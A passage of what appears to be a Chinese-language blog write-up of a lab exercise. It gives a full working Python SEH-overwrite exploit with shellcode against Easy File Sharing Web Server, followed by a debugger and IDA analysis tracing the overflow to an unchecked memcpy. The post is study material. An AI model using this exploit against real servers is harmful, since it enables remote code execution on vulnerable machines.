+<figure class="highlight taggerscript"><table><tr><td class="code"><pre><span class="line">import socket</span><br><span class="line">import sys</span><br><span class="line"> </span><br><span class="line">host = str(sys.argv[1])  </span><br><span class="line">port = int(sys.argv[2])	 </span><br><span class="line"> </span><br><span class="line">a = socket.socket() </span><br><span class="line"> </span><br><span class="line">print &quot;Connecting to: &quot; + host + &quot;:&quot; + str(port)</span><br><span class="line">a.connect((host,port)) </span><br><span class="line"></span><br><span class="line">offset = &#x27;a&#x27; * 4061   	# 覆盖SEH结构体的第一个成员NEXT SEH的偏移</span><br><span class="line">Nseh = &quot;<span class="symbol">\x</span>eb<span class="symbol">\x</span>14<span class="symbol">\x</span>90<span class="symbol">\x</span>90&quot; 	# jmp 0x14 指令</span><br><span class="line">seh = &quot;<span class="symbol">\x</span>a3<span class="symbol">\x</span>02<span class="symbol">\x</span>01<span class="symbol">\x</span>10&quot; 	# 我们找到的 pop-pop-ret 指令的地址——例如 0x100102a3</span><br><span class="line">nop = &quot;<span class="symbol">\x</span>90&quot; * 20 	# nop指令——防止jmp跳转过头</span><br><span class="line">shellcode = (</span><br><span class="line">&quot;<span class="symbol">\x</span>d9<span class="symbol">\x</span>cb<span class="symbol">\x</span>be<span class="symbol">\x</span>b9<span class="symbol">\x</span>23<span class="symbol">\x</span>67<span class="symbol">\x</span>31<span class="symbol">\x</span>d9<span class="symbol">\x</span>74<span class="symbol">\x</span>24<span class="symbol">\x</span>f4<span class="symbol">\x</span>5a<span class="symbol">\x</span>29<span class="symbol">\x</span>c9&quot;</span><br><span class="line">&quot;<span class="symbol">\x</span>b1<span class="symbol">\x</span>13<span class="symbol">\x</span>31<span class="symbol">\x</span>72<span class="symbol">\x</span>19<span class="symbol">\x</span>83<span class="symbol">\x</span>c2<span class="symbol">\x</span>04<span class="symbol">\x</span>03<span class="symbol">\x</span>72<span class="symbol">\x</span>15<span class="symbol">\x</span>5b<span class="symbol">\x</span>d6<span class="symbol">\x</span>56&quot;</span><br><span class="line">&quot;<span class="symbol">\x</span>e3<span class="symbol">\x</span>c9<span class="symbol">\x</span>71<span class="symbol">\x</span>fa<span class="symbol">\x</span>62<span class="symbol">\x</span>81<span class="symbol">\x</span>e2<span class="symbol">\x</span>75<span class="symbol">\x</span>82<span class="symbol">\x</span>0b<span class="symbol">\x</span>b3<span class="symbol">\x</span>e1<span class="symbol">\x</span>c0<span class="symbol">\x</span>d9&quot;</span><br><span class="line">&quot;<span class="symbol">\x</span>0b<span class="symbol">\x</span>61<span class="symbol">\x</span>a0<span class="symbol">\x</span>11<span class="symbol">\x</span>e7<span class="symbol">\x</span>03<span class="symbol">\x</span>41<span class="symbol">\x</span>84<span class="symbol">\x</span>7c<span class="symbol">\x</span>db<span class="symbol">\x</span>d2<span class="symbol">\x</span>a8<span class="symbol">\x</span>9a<span class="symbol">\x</span>97&quot;</span><br><span class="line">&quot;<span class="symbol">\x</span>ba<span class="symbol">\x</span>68<span class="symbol">\x</span>10<span class="symbol">\x</span>fb<span class="symbol">\x</span>5b<span class="symbol">\x</span>e8<span class="symbol">\x</span>ad<span class="symbol">\x</span>70<span class="symbol">\x</span>7b<span class="symbol">\x</span>28<span class="symbol">\x</span>b3<span class="symbol">\x</span>86<span class="symbol">\x</span>08<span class="symbol">\x</span>64&quot;</span><br><span class="line">&quot;<span class="symbol">\x</span>ac<span class="symbol">\x</span>52<span class="symbol">\x</span>0e<span class="symbol">\x</span>8d<span class="symbol">\x</span>dd<span class="symbol">\x</span>2d<span class="symbol">\x</span>3c<span class="symbol">\x</span>3c<span class="symbol">\x</span>a0<span class="symbol">\x</span>fc<span class="symbol">\x</span>bc<span class="symbol">\x</span>82<span class="symbol">\x</span>23<span class="symbol">\x</span>a8&quot;</span><br><span class="line">&quot;<span class="symbol">\x</span>d7<span class="symbol">\x</span>94<span class="symbol">\x</span>6e<span class="symbol">\x</span>23<span class="symbol">\x</span>d9<span class="symbol">\x</span>e3<span class="symbol">\x</span>05<span class="symbol">\x</span>d4<span class="symbol">\x</span>05<span class="symbol">\x</span>f2<span class="symbol">\x</span>1b<span class="symbol">\x</span>e9<span class="symbol">\x</span>09<span class="symbol">\x</span>5a&quot;</span><br><span class="line">&quot;<span class="symbol">\x</span>1c<span class="symbol">\x</span>39<span class="symbol">\x</span>bd&quot;</span><br><span class="line">) 					</span><br><span class="line"># 这个shellcode的功能是 弹计算机并使程序崩溃（利用kali漏洞利用库里的 39009.py 里的shellcode） </span><br><span class="line"></span><br><span class="line">exploit = offset + Nseh + seh + nop + shellcode</span><br><span class="line">fill =  &quot;b&quot; * (5000-len(buff)) # 防止栈溢出未触发异常</span><br><span class="line">buff = exploit + fill</span><br><span class="line"></span><br><span class="line">a.send(&quot;GET &quot; + buff + &quot; HTTP/1.0<span class="symbol">\r</span><span class="symbol">\n</span><span class="symbol">\r</span><span class="symbol">\n</span>&quot;)</span><br><span class="line"> </span><br><span class="line">a.close()</span><br><span class="line"> </span><br><span class="line">print &quot;Done...&quot;</span><br></pre></td></tr></table></figure>
+
+<h4 id="漏洞exp测试"><a href="#漏洞exp测试" class="headerlink" title="漏洞exp测试"></a>漏洞exp测试</h4><p>在kali是运行easyfileshring_exp.py，调试发现靶机里的shellcode被顺利执行了：</p>
+<p><img src="https://my-tc-1308282641.cos.ap-guangzhou.myqcloud.com/markdown/typora-user-images/Screenshot%202021-11-05%20231026.jpg" alt="Screenshot 2021-11-05 231026"></p>
+<h3 id="模拟实战攻击"><a href="#模拟实战攻击" class="headerlink" title="模拟实战攻击"></a>模拟实战攻击</h3><p>在靶机上正常运行漏洞程序：</p>
+<p><img src="https://my-tc-1308282641.cos.ap-guangzhou.myqcloud.com/markdown/typora-user-images/Screenshot%202021-11-05%20231715.jpg" alt="Screenshot 2021-11-05 231715"></p>
+<p>在kali中利用exp攻击靶机漏洞程序，</p>
+<p><img src="https://my-tc-1308282641.cos.ap-guangzhou.myqcloud.com/markdown/typora-user-images/Screenshot%202021-11-05%20231900.jpg" alt="Screenshot 2021-11-05 231900"></p>
+<p>攻击结果：</p>
+<p><img src="https://my-tc-1308282641.cos.ap-guangzhou.myqcloud.com/markdown/typora-user-images/Screenshot%202021-11-05%20231942.jpg" alt="Screenshot 2021-11-05 231942"></p>
+<p>模拟远程攻击成功，成功执行shellcode。</p>
+<h2 id="漏洞产生原因分析"><a href="#漏洞产生原因分析" class="headerlink" title="漏洞产生原因分析"></a>漏洞产生原因分析</h2><p>我们想知道这个程序中的栈溢出漏洞是怎么产生的以及溢出点在哪？</p>
+<h3 id="动静结合（ida-调试器）"><a href="#动静结合（ida-调试器）" class="headerlink" title="动静结合（ida+调试器）"></a>动静结合（ida+调试器）</h3><p>这里我没有使用immunity debuger进行动态调试，而是利用x32dbg，因为我个人感觉x32的界面比较舒服，进行溢出点寻找时比较方便。</p>
+<p>现在用x32dbg打开漏洞程序，然后在kali上运行exp攻击它，我们可以看到程序断在了<code>0x61C277F6</code>，这个地方我们已经无比熟悉了，eax被溢出值覆盖了，导致程序触发异常。</p>
+<p><img src="https://my-tc-1308282641.cos.ap-guangzhou.myqcloud.com/markdown/typora-user-images/Screenshot%202021-11-07%20175628.jpg" alt="Screenshot 2021-11-07 175628"></p>
+<p>我们目前的思路是先找到eax的来源，因为知道eax的来源就是我们要找的溢出点了，现在打开call stack窗口，</p>
+<p><img src="https://my-tc-1308282641.cos.ap-guangzhou.myqcloud.com/markdown/typora-user-images/image-20211107180829184.png" alt="image-20211107180829184"></p>
+<p>看到程序现在跑到了sqlite3模块里面了，即sqlite3.dll，我们将程序安装目录里的sqlite3.dll拉到ida里分析一下，在ida中查找一下程序中断的那个地址，在<code>sqlite3SafeCheckOK()</code>里，</p>
+<p><img src="https://my-tc-1308282641.cos.ap-guangzhou.myqcloud.com/markdown/typora-user-images/Screenshot%202021-11-07%20181510.jpg" alt="Screenshot 2021-11-07 181510"></p>
+<p>可以看到让程序中断的那个eax就是这个函数的参数a1，并且只知道eax来源于上层函数<br>让我们看看堆栈调用，再次打开call stack，</p>
+<p><img src="https://my-tc-1308282641.cos.ap-guangzhou.myqcloud.com/markdown/typora-user-images/Screenshot%202021-11-07%20210322.jpg" alt="Screenshot 2021-11-07 210322"></p>
+<p>根据第一个返回地址<code>0x61C6286C</code>，我们定位到_sqlite3LockAndPrepare函数</p>
+<p><img src="https://my-tc-1308282641.cos.ap-guangzhou.myqcloud.com/markdown/typora-user-images/Screenshot%202021-11-07%20194352.jpg" alt="Screenshot 2021-11-07 194352"></p>
+<p><img src="https://my-tc-1308282641.cos.ap-guangzhou.myqcloud.com/markdown/typora-user-images/Screenshot%202021-11-07%20210615.jpg" alt="Screenshot 2021-11-07 210615"></p>
+<p>这里还是没有发现eax的来源，那我们还是看fsws.<code>00496624</code> 吧，通过它我们定位到了<code>sub_496600</code>函数，</p>
+<p><img src="https://my-tc-1308282641.cos.ap-guangzhou.myqcloud.com/markdown/typora-user-images/Screenshot%202021-11-07%20204505.jpg" alt="Screenshot 2021-11-07 204505"></p>
+<p>这里的eax来源于这里的ecx的引用，我们在<code>sub_496600</code>函数开头下一个断点，在kali上运行exp，在程序断下来后，再F9运行，第三次断下来时，发现ecx里的地址<code>05277030</code>里存着 “AAAA…..”，即0x41414141,</p>
+<p><img src="https://my-tc-1308282641.cos.ap-guangzhou.myqcloud.com/markdown/typora-user-images/Screenshot%202021-11-07%20214014.jpg" alt="Screenshot 2021-11-07 214014"></p>
+<p>那这个<code>0x41414141</code>是什么时候复制到栈上的呢？ 我们对<strong>ecx的值</strong>下一个<strong>写入断点</strong>吧，</p>
+<p>（注意这里要在第一次断在 0x496600 时，对ecx的值下写入断点，因为ecx的值是栈的地址，每一次运行程序都会改变）</p>
+<p>再次运行程序，程序断在了这里，</p>
+<p><img src="https://my-tc-1308282641.cos.ap-guangzhou.myqcloud.com/markdown/typora-user-images/Screenshot%202021-11-07%20220915.jpg" alt="Screenshot 2021-11-07 220915"></p>
+<p>我们用ida看看这个地址,在<code>write_char()</code>里</p>
+<p><img src="https://my-tc-1308282641.cos.ap-guangzhou.myqcloud.com/markdown/typora-user-images/Screenshot%202021-11-07%20221056.jpg" alt="Screenshot 2021-11-07 221056"></p>
+<p>那我们看看堆栈信息，</p>
+<p><img src="https://my-tc-1308282641.cos.ap-guangzhou.myqcloud.com/markdown/typora-user-images/Screenshot%202021-11-07%20221428.jpg" alt="Screenshot 2021-11-07 221428"></p>
+<p>依次查看这几个返回地址，并在ida里分析后,我们发现，是<code>0x4F907A</code>的 </p>
+<p><code>sprintf()</code>    <strong>–&gt;</strong>    <code>sub_500050()</code>     <strong>–&gt;</strong>    <code>write_string()</code>    <strong>–&gt;</strong>    <code>write_char()</code></p>
+<p><img src="https://my-tc-1308282641.cos.ap-guangzhou.myqcloud.com/markdown/typora-user-images/Screenshot%202021-11-07%20224120.jpg" alt="Screenshot 2021-11-07 224120"></p>
+<p>那么我们看最后一个返回地址<code>0x497483</code>，在ida里查看，</p>
+<p><img src="https://my-tc-1308282641.cos.ap-guangzhou.myqcloud.com/markdown/typora-user-images/image-20211107224548084.png" alt="image-20211107224548084"></p>
+<p>在<code>0x497475</code>下一个断点，</p>
+<p><img src="https://my-tc-1308282641.cos.ap-guangzhou.myqcloud.com/markdown/typora-user-images/Screenshot%202021-11-07%20224636.jpg" alt="Screenshot 2021-11-07 224636"></p>
+<p>我想跑到这看看拼接的字符串，</p>
+<p>第一次断下来,我们执行到sprintf函数，看看栈上的参数，</p>
+<p><img src="H:/Users/DH/%E6%A1%8C%E9%9D%A2/%E5%A4%8D%E7%8E%B0A/3/Screenshot%202021-11-07%20225257.jpg" alt="Screenshot 2021-11-07 225257"></p>
+<p>发现<strong>edi</strong>指向的地址里储存着“AAAA…..”，即0x41414141，作为格式化字符串的第三个参数，按F8单步执行完sprinf函数后，</p>
+<p><img src="https://my-tc-1308282641.cos.ap-guangzhou.myqcloud.com/markdown/typora-user-images/Screenshot%202021-11-07%20225824.jpg" alt="Screenshot 2021-11-07 225824"></p>
+<p>发现，这么长的畸形字符串复制到栈上，使用sprintf格式化后进行拼接，这就造成栈溢出了<br>看看确实拼接成sql语句了，之后就有了程序把这一串sql语句拿去给sqlite3.dll处理的时候造成异常，导致程序中断。</p>
+<p>具体路径如下，sprintf执行完下一条语句是调用sub_500050函数<br><code>sub_500050()</code>     <strong>–&gt;</strong>    <code>write_string()</code>    <strong>–&gt;</strong>    <code>write_char()</code>     <strong>–&gt;</strong>    <code>sub_496600</code>     <strong>–&gt;</strong>    <code>sqlite3_prepare_v2</code>     <strong>–&gt;</strong>    <code>sqlite3LockAndPrepare</code>     <strong>–&gt;</strong>    <code>sqlite3SafetyCheckOk(在这函数里面异常)</code></p>
+<p>现在我们看看<strong>edi</strong>里的值是从哪来的，在ida里分析<strong>edi</strong>就是<strong>a3</strong>，而<strong>a3</strong>的值是调用<code>sub_497380()</code>的函数传给<code>sub_497380()</code>的，</p>
+<p><img src="https://my-tc-1308282641.cos.ap-guangzhou.myqcloud.com/markdown/typora-user-images/Screenshot%202021-11-08%20111816.jpg" alt="Screenshot 2021-11-08 111816"></p>
+<p>在<code>sub_497380()</code>开头下一个断点，让程序断在这里，观察栈上返回地址，</p>
+<p><img src="https://my-tc-1308282641.cos.ap-guangzhou.myqcloud.com/markdown/typora-user-images/Screenshot%202021-11-08%20131301.jpg" alt="Screenshot 2021-11-08 131301"></p>
+<p>通过返回地址<code>0x42DE73</code>，在ida里定位，</p>
+<p><img src="https://my-tc-1308282641.cos.ap-guangzhou.myqcloud.com/markdown/typora-user-images/Screenshot%202021-11-08%20131440.jpg" alt="Screenshot 2021-11-08 131440"></p>
+<p>发现<code>sub_497380()</code>的参数 <strong>a3</strong> 是函数<code>sub_52D5E7()</code>的返回值，我们进去看看，</p>
+<p><img src="https://my-tc-1308282641.cos.ap-guangzhou.myqcloud.com/markdown/typora-user-images/Screenshot%202021-11-08%20131706.jpg" alt="Screenshot 2021-11-08 131706"></p>
+<p>在x32dbg里调试发现畸形字符串不是在这里产生的，</p>
+<p>那我们再回到上一层调用看看参数<strong>this</strong>是从哪来的，</p>
+<p><img src="https://my-tc-1308282641.cos.ap-guangzhou.myqcloud.com/markdown/typora-user-images/Screenshot%202021-11-08%20203438.jpg" alt="Screenshot 2021-11-08 203438"></p>
+<p>参数<strong>this</strong>就是这里的<strong>Substr</strong>，我们利用x32dbg下断点分析，分析<strong>标号1函数</strong>没有被执行，再结合ida分析知道这有个选择结构，判断条件是<strong>v15</strong>的值，<strong>v15=（v38指向的地址里存着的字符串里带有“/“？1:0）</strong>,</p>
+<p><img src="https://my-tc-1308282641.cos.ap-guangzhou.myqcloud.com/markdown/typora-user-images/Screenshot%202021-11-08%20210528.jpg" alt="Screenshot 2021-11-08 210528"></p>
+<p>调试发现，<strong>v38</strong>的指向的地址里存着的是我们要找的那个畸形字符串，并且它不带有<strong>“/“</strong>,所以程序不跑<strong>标号1函数</strong>，而是跑进了标号2函数。同时我们也可以知道<strong>标号2函数</strong>也不是产生畸形字符串的地方，因为在它之前<strong>v38</strong>已经出现了，那么我们找一下<strong>v38</strong>里的值是从哪来的，</p>
+<p><img src="https://my-tc-1308282641.cos.ap-guangzhou.myqcloud.com/markdown/typora-user-images/Screenshot%202021-11-08%20212216.jpg" alt="Screenshot 2021-11-08 212216"></p>
+<p>我们进去看看，</p>
+<p><img src="https://my-tc-1308282641.cos.ap-guangzhou.myqcloud.com/markdown/typora-user-images/Screenshot%202021-11-08%20212754.jpg" alt="Screenshot 2021-11-08 212754"></p>
+<p>结合x32dbg调试，发现<strong>v38</strong>里畸形字符串就是在这个函数<code>sub_52D225</code>中产生的，因为这个函数中使用了<code>lstrlneA()</code>获得报文中的字符串长度，然后没有检验长度是否符合要求，直接使用<code>memcpy_0()</code>将这个畸形字符串完整的复制到栈上。</p>
+<h2 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h2><p>这个程序的漏洞是由于没有对字符串长度进行检查，直接使用<code>memcpy()</code>将报文中大量字符串复制到栈上，造成栈溢出。因为这个程序开启了栈保护，所以我通过栈溢出来覆盖SEH达到绕过栈保护执行任意代码。这次实验一共花了4天时间完成，不足的地方有很多，做了很多重复无用的工作，只能说经验不足吧。不过这次实验对我的收获很大，让我对动态调试和静态分析的使用更加熟练了。</p>
+<h3 id="参考"><a href="#参考" class="headerlink" title="参考"></a>参考</h3><p><a target="_blank" rel="noopener" href="https://www.shogunlab.com/blog/2017/11/06/zdzg-windows-exploit-4.html">https://www.shogunlab.com/blog/2017/11/06/zdzg-windows-exploit-4.html</a></p>
+</article><div class="post-copyright"><div class="post-copyright__author"><span class="post-copyright-meta">文章作者: </span><span class="post-copyright-info"><a href="mailto:undefined">pyh</a></span></div><div class="post-copyright__type"><span class="post-copyright-meta">文章链接: </span><span class="post-copyright-info"><a href="http://example.com/2021/11/05/Windows%E6%BC%8F%E6%B4%9E%E5%AD%A6%E4%B9%A0%E4%B9%8B%E8%A6%86%E7%9B%96SEH%E6%BC%8F%E6%B4%9E/">http://example.com/2021/11/05/Windows%E6%BC%8F%E6%B4%9E%E5%AD%A6%E4%B9%A0%E4%B9%8B%E8%A6%86%E7%9B%96SEH%E6%BC%8F%E6%B4%9E/</a></span></div><div class="post-copyright__notice"><span class="post-copyright-meta">版权声明: </span><span class="post-copyright-info">本博客所有文章除特别声明外，均采用 <a href="https://creativecommons.org/licenses/by-nc-sa/4.0/" target="_blank">CC BY-NC-SA 4.0</a> 许可协议。转载请注明来自 <a href="http://example.com" target="_blank">爱玩且很菜</a>！</span></div></div><div class="tag_share"><div class="post-meta__tag-list"><a class="post-meta__tags" href="/tags/PWN/">PWN</a><a class="post-meta__tags" href="/tags/%E6%A0%88%E6%BA%A2%E5%87%BA/">栈溢出</a><a class="post-meta__tags" href="/tags/SEH/">SEH</a></div><div class="post_share"><div class="social-share" data-image="https://my-tc-1308282641.cos.ap-guangzhou.myqcloud.com/markdown/typora-user-images/wallhaven-5738y9.jpg" data-sites="facebook,twitter,wechat,weibo,qq"></div><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/social-share.js/dist/css/share.min.css" media="print" onload="this.media='all'"><script src="https://cdn.jsdelivr.net/npm/social-share.js/dist/js/social-share.min.js" defer></script></div></div><nav class="pagination-post" id="pagination"><div class="prev-post pull-left"><a href="/2021/11/15/OWASP-Top10--2021/"><img class="prev-cover" src="https://my-tc-1308282641.cos.ap-guangzhou.myqcloud.com/markdown/typora-user-images/wallhaven-3z2ge3.jpg" onerror="onerror=null;src='/img/404.jpg'" alt="cover of previous post"><div class="pagination-info"><div class="label">上一篇</div><div class="prev_info">OWASP Top10 -2021</div></div></a></div><div class="next-post pull-right"><a href="/2021/11/03/Metasploit%E7%9A%84%E7%AE%80%E5%8D%95%E5%BA%94%E7%94%A8/"><img class="next-cover" src="https://my-tc-1308282641.cos.ap-guangzhou.myqcloud.com/markdown/typora-user-images/wallhaven-pkl2ge.jpg" onerror="onerror=null;src='/img/404.jpg'" alt="cover of next post"><div class="pagination-info"><div class="label">下一篇</div><div class="next_info">Metasploit的简单应用</div></div></a></div></nav><div class="relatedPosts"><div class="headline"><i class="fas fa-thumbs-up fa-fw"></i><span>相关推荐</span></div><div class="relatedPosts-list"><div><a href="/2021/11/02/%E6%A0%88%E6%BA%A2%E5%87%BA%E6%BC%8F%E6%B4%9E%E7%9A%84%E7%BB%86%E8%8A%82%E7%82%B9/" title="栈溢出漏洞的细节点"><img class="cover" src="https://my-tc-1308282641.cos.ap-guangzhou.myqcloud.com/markdown/typora-user-images/wallhaven-7223xo.jpg" alt="cover"><div class="content is-center"><div class="date"><i class="far fa-calendar-alt fa-fw"></i> 2021-11-02</div><div class="title">栈溢出漏洞的细节点</div></div></a></div><div><a href="/2022/01/27/CTF-pwn%20%E6%8A%80%E6%9C%AF%E6%80%BB%E7%BB%93%EF%BC%882%EF%BC%89/" title="CTF-pwn 技术总结（2）"><img class="cover" src="https://my-tc-1308282641.cos.ap-guangzhou.myqcloud.com/markdown/typora-user-images/wallhaven-o3j755.jpg" alt="cover"><div class="content is-center"><div class="date"><i class="far fa-calendar-alt fa-fw"></i> 2022-01-27</div><div class="title">CTF-pwn 技术总结（2）</div></div></a></div><div><a href="/2021/11/15/GUET%E6%A2%A6%E6%9E%81%E5%85%89%E6%9D%AF%EF%BC%88%E6%A0%A1%E8%B5%9B%EF%BC%89%E7%BA%BF%E4%B8%8APWN%E9%83%A8%E5%88%86wp/" title="GUET梦极光杯（校赛）线上 PWN部分wp"><img class="cover" src="https://my-tc-1308282641.cos.ap-guangzhou.myqcloud.com/markdown/typora-user-images/wallhaven-z8o88j.jpg" alt="cover"><div class="content is-center"><div class="date"><i class="far fa-calendar-alt fa-fw"></i> 2021-11-15</div><div class="title">GUET梦极光杯（校赛）线上 PWN部分wp</div></div></a></div><div><a href="/2021/11/23/GUET%E6%A2%A6%E6%9E%81%E5%85%89%E6%9D%AF%EF%BC%88%E6%A0%A1%E8%B5%9B%EF%BC%89%E7%BA%BF%E4%B8%8B%20PWN%E8%B5%9B%E5%90%8E%E5%A4%8D%E7%8E%B0/" title="GUET梦极光杯（校赛）线下-PWN题赛后复现"><img class="cover" src="https://my-tc-1308282641.cos.ap-guangzhou.myqcloud.com/markdown/typora-user-images/wallhaven-573y33.jpg" alt="cover"><div class="content is-center"><div class="date"><i class="far fa-calendar-alt fa-fw"></i> 2021-11-23</div><div class="title">GUET梦极光杯（校赛）线下-PWN题赛后复现</div></div></a></div><div><a href="/2022/01/10/CTF-pwn%20%E6%8A%80%E6%9C%AF%E6%80%BB%E7%BB%93%EF%BC%881%EF%BC%89/" title="CTF-pwn 技术总结（1）"><img class="cover" src="https://my-tc-1308282641.cos.ap-guangzhou.myqcloud.com/markdown/typora-user-images/wallhaven-o37o8l.jpg" alt="cover"><div class="content is-center"><div class="date"><i class="far fa-calendar-alt fa-fw"></i> 2022-01-10</div><div class="title">CTF-pwn 技术总结（1）</div></div></a></div><div><a href="/2021/12/15/%E4%BA%8C%E8%BF%9B%E5%88%B6%E6%BC%8F%E6%B4%9E%E4%B9%8B%E6%95%B0%E7%BB%84%E8%B6%8A%E7%95%8C/" title="二进制漏洞之数组越界"><img class="cover" src="https://my-tc-1308282641.cos.ap-guangzhou.myqcloud.com/markdown/typora-user-images/wallhaven-dp2gpg.jpg" alt="cover"><div class="content is-center"><div class="date"><i class="far fa-calendar-alt fa-fw"></i> 2021-12-15</div><div class="title">二进制漏洞之数组越界</div></div></a></div></div></div><hr/><div id="post-comment"><div class="comment-head"><div class="comment-headline"><i class="fas fa-comments fa-fw"></i><span> 评论</span></div><div id="comment-switch"><span class="first-comment">Valine</span><span class="switch-btn"></span><span class="second-comment">Disqus</span></div></div><div class="comment-wrap"><div><div class="vcomment" id="vcomment"></div></div><div><div id="disqus_thread"></div></div></div></div></div><div class="aside-content" id="aside-content"><div class="card-widget card-info"><div class="is-center"><div class="avatar-img"><img src="https://my-tc-1308282641.cos.ap-guangzhou.myqcloud.com/markdown/typora-user-images/1580288142723622.jpg" onerror="this.onerror=null;this.src='/img/friend_404.gif'" alt="avatar"/></div><div class="author-info__name">pyh</div><div class="author-info__description"></div></div><div class="card-info-data"><div class="card-info-data-item is-center"><a href="/archives/"><div class="headline">文章</div><div class="length-num">39</div></a></div><div class="card-info-data-item is-center"><a href="/tags/"><div class="headline">标签</div><div class="length-num">24</div></a></div><div class="card-info-data-item is-center"><a href="/categories/"><div class="headline">分类</div><div class="length-num">20</div></a></div></div><a class="button--animated" id="card-info-btn" target="_blank" rel="noopener" href="https://sf2333.github.io/"><i class="fab fa-github"></i><span>Follow Me</span></a></div><div class="card-widget card-announcement"><div class="item-headline"><i class="fas fa-bullhorn card-announcement-animation"></i><span>公告</span></div><div class="announcement_content">This is my Blog</div></div><div class="sticky_layout"><div class="card-widget" id="card-toc"><div class="item-headline"><i class="fas fa-stream"></i><span>目录</span></div><div class="toc-content"><ol class="toc"><li class="toc-item toc-level-1"><a class="toc-link" href="#Windows%E6%BC%8F%E6%B4%9E%E5%AD%A6%E4%B9%A0%E4%B9%8B%E6%A0%88%E6%BA%A2%E5%87%BA%E8%A6%86%E7%9B%96SEH"><span class="toc-number">1.</span> <span class="toc-text">Windows漏洞学习之栈溢出覆盖SEH</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#0x00-%E7%AE%80%E4%BB%8B"><span class="toc-number">1.1.</span> <span class="toc-text">0x00 简介</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#0x01-SEH%E4%BB%8B%E7%BB%8D"><span class="toc-number">1.2.</span> <span class="toc-text">0x01 SEH介绍</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#0x02-%E5%88%A9%E7%94%A8SEH"><span class="toc-number">1.3.</span> <span class="toc-text">0x02 利用SEH</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#%E5%9F%BA%E6%9C%AC%E6%AD%A5%E9%AA%A4%EF%BC%9A"><span class="toc-number">1.3.1.</span> <span class="toc-text">基本步骤：</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#0x03-%E5%AE%9E%E9%AA%8C%E8%BF%87%E7%A8%8B"><span class="toc-number">1.4.</span> <span class="toc-text">0x03 实验过程</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#%E5%AE%9E%E9%AA%8C%E7%8E%AF%E5%A2%83%E4%B8%8E%E5%B7%A5%E5%85%B7"><span class="toc-number">1.4.1.</span> <span class="toc-text">实验环境与工具</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E6%9C%AC%E5%9C%B0%E8%B0%83%E8%AF%95"><span class="toc-number">1.4.2.</span> <span class="toc-text">本地调试</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#%E7%A1%AE%E8%AE%A4%E6%BC%8F%E6%B4%9E"><span class="toc-number">1.4.2.1.</span> <span class="toc-text">确认漏洞</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#%E6%9E%84%E9%80%A0exp"><span class="toc-number">1.4.2.2.</span> <span class="toc-text">构造exp</span></a><ol class="toc-child"><li class="toc-item toc-level-5"><a class="toc-link" href="#%E8%BF%99%E9%87%8C%E4%BD%A0%E4%BB%AC%E8%82%AF%E5%AE%9A%E4%BC%9A%E5%86%92%E5%87%BA%E5%87%A0%E4%B8%AA%E7%96%91%E9%97%AE%EF%BC%9F%EF%BC%88%E8%BF%99%E5%87%A0%E4%B8%AA%E9%97%AE%E9%A2%98%E7%9A%84%E7%AD%94%E6%A1%88%E6%AD%A3%E6%98%AF%E6%88%91%E4%BB%AC%E6%9E%84%E9%80%A0payload%E7%9A%84%E5%85%B3%E9%94%AE%E7%82%B9%EF%BC%89"><span class="toc-number">1.4.2.2.1.</span> <span class="toc-text">这里你们肯定会冒出几个疑问？（这几个问题的答案正是我们构造payload的关键点）</span></a><ol class="toc-child"><li class="toc-item toc-level-6"><a class="toc-link" href="#Windows%E5%BC%82%E5%B8%B8%E5%A4%84%E7%90%86%E6%9C%BA%E5%88%B6"><span class="toc-number">1.4.2.2.1.1.</span> <span class="toc-text">Windows异常处理机制</span></a></li></ol></li></ol></li><li class="toc-item toc-level-4"><a class="toc-link" href="#%E6%BC%8F%E6%B4%9Eexp%E6%B5%8B%E8%AF%95"><span class="toc-number">1.4.2.3.</span> <span class="toc-text">漏洞exp测试</span></a></li></ol></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E6%A8%A1%E6%8B%9F%E5%AE%9E%E6%88%98%E6%94%BB%E5%87%BB"><span class="toc-number">1.4.3.</span> <span class="toc-text">模拟实战攻击</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E6%BC%8F%E6%B4%9E%E4%BA%A7%E7%94%9F%E5%8E%9F%E5%9B%A0%E5%88%86%E6%9E%90"><span class="toc-number">1.5.</span> <span class="toc-text">漏洞产生原因分析</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#%E5%8A%A8%E9%9D%99%E7%BB%93%E5%90%88%EF%BC%88ida-%E8%B0%83%E8%AF%95%E5%99%A8%EF%BC%89"><span class="toc-number">1.5.1.</span> <span class="toc-text">动静结合（ida+调试器）</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E6%80%BB%E7%BB%93"><span class="toc-number">1.6.</span> <span class="toc-text">总结</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#%E5%8F%82%E8%80%83"><span class="toc-number">1.6.1.</span> <span class="toc-text">参考</span></a></li></ol></li></ol></li></ol></div></div><div class="card-widget card-recent-post"><div class="item-headline"><i class="fas fa-history"></i><span>最新文章</span></div><div class="aside-list"><div class="aside-list-item"><a class="thumbnail" href="/2022/09/13/%E7%88%AC%E8%99%AB%E7%AC%94%E8%AE%B0/" title="爬虫笔记"><img src="https://my-tc-1308282641.cos.ap-guangzhou.myqcloud.com/markdown/wallhaven-g73xx3.jpg" onerror="this.onerror=null;this.src='/img/404.jpg'" alt="爬虫笔记"/></a><div class="content"><a class="title" href="/2022/09/13/%E7%88%AC%E8%99%AB%E7%AC%94%E8%AE%B0/" title="爬虫笔记">爬虫笔记</a><time datetime="2022-09-13T12:45:53.000Z" title="发表于 2022-09-13 20:45:53">2022-09-13</time></div></div><div class="aside-list-item"><a class="thumbnail" href="/2022/04/25/AFL-Fuzz-training%E7%AC%94%E8%AE%B0/" title="AFL-Fuzz training笔记"><img src="https://my-tc-1308282641.cos.ap-guangzhou.myqcloud.com/markdown/wallhaven-57o619.jpg" onerror="this.onerror=null;this.src='/img/404.jpg'" alt="AFL-Fuzz training笔记"/></a><div class="content"><a class="title" 